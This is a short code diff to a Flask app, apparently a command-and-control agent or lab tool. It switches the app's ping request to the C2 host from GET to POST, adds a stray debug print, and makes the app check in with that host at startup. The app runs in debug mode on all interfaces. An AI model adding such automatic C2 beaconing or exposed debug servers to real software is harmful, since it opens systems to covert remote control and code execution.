@@ -83,7 +83,8 @@ def uptime():
 
 @app.route("/ping")
 def ping():
-    response = r.get(f'http://{C2_ADDRESS}/')
+    response = r.post(f'http://{C2_ADDRESS}/')
+    print(f"http://")
     if response.status_code == 200:
         return "Ping successful"
     else:
@@ -95,7 +96,7 @@ def ping():
 if __name__ == '__main__':
     # run() method of Flask class runs the application
     # on the local development server.
-
+    ping()
     start = time.time()
     app.run(debug=True, host="0.0.0.0", port=80)
 
